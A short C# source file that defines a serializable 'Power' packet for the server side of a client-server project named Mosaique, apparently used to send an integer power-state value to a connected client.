using Serveur.Controllers.Server;
using Serveur.Packets;
using ZeroFormatter;

namespace MosaiqueServeur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class Power : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.Power;
            }
        }

        [Index(0)]
        public virtual int powerInt { get; set; }

        public Power()
        {
        }

        public Power(int powerInt)
        {
            this.powerInt = powerInt;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
